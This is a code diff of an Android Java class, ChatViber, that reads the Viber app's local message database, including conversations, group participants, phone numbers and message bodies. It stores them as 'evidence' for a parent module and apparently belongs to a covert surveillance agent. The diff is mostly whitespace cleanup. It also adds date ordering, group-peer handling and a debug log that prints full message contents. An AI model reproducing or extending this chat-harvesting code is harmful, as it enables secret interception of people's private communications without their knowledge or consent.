@@ -70,7 +70,7 @@ public class ChatViber extends SubModuleChat {
 		try {
 			account = readMyPhoneNumber();
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
-			
+
 			readViberMessageHistory();
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
@@ -137,28 +137,32 @@ public class ChatViber extends SubModuleChat {
 				SQLiteDatabase db = helper.getReadableDatabase();
 
 				groups = new ChatViberGroups();
-				
+
 				List<ViberConversation> conversations = getViberConversations(helper, account);
 				for (ViberConversation sc : conversations) {
-					
+
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: "
-								+ sc.date);
+						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: " + sc.date);
 					}
 
 					// retrieves the lastConvId recorded as evidence for this
 					// conversation
 					String thread = Long.toString(sc.id);
 					long lastConvId = lastViber.containsKey(thread) ? lastViber.get(thread) : 0;
-					
+
 					if (sc.date > lastConvId) {
 						if (groups.isGroup(thread) && !groups.hasMemoizedGroup(thread)) {
 							fetchParticipants(helper, thread);
+							groups.addPeerToGroup(thread, account);
 						}
 
 						long lastReadId = fetchMessages(helper, sc, lastConvId);
 						if (lastReadId > 0) {
 							updateMarkupViber(thread, lastReadId, true);
+						}
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (readViberMessageHistory) nothing new in conversation: " + thread);
 						}
 					}
 				}
@@ -198,29 +202,29 @@ public class ChatViber extends SubModuleChat {
 		helper.traverseRecords("threads", visitor);
 		return conversations;
 	}
-	
+
 	// fetch participants.
 	private void fetchParticipants(GenericSqliteHelper helper, final String thread_id) {
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchGroup) : " + thread_id);
 		}
-	
+
 		String[] projection = { "contact_id", "number", "contact_name", "display_name" };
-		String selection = "thread_id" + "='" + thread_id + "' and contact_id >= 0" ;
-	
+		String selection = "thread_id" + "='" + thread_id + "' and contact_id >= 0";
+
 		// final Set<String> remotes = new HashSet<String>();
-		//groups.addPeerToGroup(thread_id, "-1");
+		// groups.addPeerToGroup(thread_id, "-1");
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
-	
+
 			@Override
 			public long cursor(Cursor cursor) {
 				String id = cursor.getString(0);
 				String number = cursor.getString(1);
 				String name = cursor.getString(2);
 				String display_name = cursor.getString(3);
-				
-				Contact contact = new Contact( id, number, name, display_name );
+
+				Contact contact = new Contact(id, number, name, display_name);
 				// remotes.add(remote);
 				if (number != null) {
 					groups.addPeerToGroup(thread_id, contact);
@@ -228,9 +232,9 @@ public class ChatViber extends SubModuleChat {
 				return 0;
 			}
 		};
-	
+
 		helper.traverseRecords("participants", visitor);
-	
+
 	}
 
 	private long fetchMessages(GenericSqliteHelper helper, final ViberConversation conversation, long lastConvId) {
@@ -240,10 +244,10 @@ public class ChatViber extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "_id", "person", "body", "date", "address", "type"  };
+			String[] projection = new String[] { "_id", "person", "body", "date", "address", "type" };
 			String selection = "thread_id = " + conversation.id + " and date > " + lastConvId;
-
-			RecordVisitor visitor = new RecordVisitor(projection, selection) {
+			String order = "date";
+			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 
 				@Override
 				public long cursor(Cursor cursor) {
@@ -257,35 +261,42 @@ public class ChatViber extends SubModuleChat {
 					Date date = new Date(timestamp);
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: " + incoming);
+						Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
+								+ incoming);
 					}
-					
+
 					boolean isGroup = groups.isGroup(Long.toString(conversation.id));
-					
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
 					}
 
 					String from, to = null;
 					String fromDisplay, toDisplay = null;
-					
-					from = incoming? address: conversation.account;
-					fromDisplay = incoming? conversation.account : from;
-					
+
+					from = incoming ? address : conversation.account;
+					fromDisplay = incoming ? conversation.account : from;
+
 					Contact contact = groups.getContact(peer);
 					String thread = Long.toString(conversation.id);
 					if (isGroup) {
+						if (peer.equals("0")) {
+							peer = conversation.account;
+						}
 						to = groups.getGroupTo(peer, thread);
 						toDisplay = to;
-					}else{
-						to = incoming? conversation.account : conversation.remote;
-						toDisplay = incoming? conversation.account : conversation.account;
+					} else {
+						to = incoming ? conversation.account : conversation.remote;
+						toDisplay = incoming ? conversation.account : conversation.account;
 					}
 
 					if (!StringUtils.isEmpty(body)) {
 						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
 								body, incoming);
 
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (cursor) message: " + message.from + " " + (message.incoming? "<-": "->") + " " + message.to + " : " + message.body);
+						}
 						messages.add(message);
 					}
 
@@ -351,7 +362,7 @@ public class ChatViber extends SubModuleChat {
 		cursor.close();
 		return changedConversations;
 	}
-	
+
 	private void updateMarkupViber(String thread_id, long newLastId, boolean serialize) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (updateMarkupSkype), mailStore: " + thread_id + " +lastId: " + newLastId);
@@ -371,7 +382,7 @@ public class ChatViber extends SubModuleChat {
 			}
 		}
 	}
-	
+
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
 	}
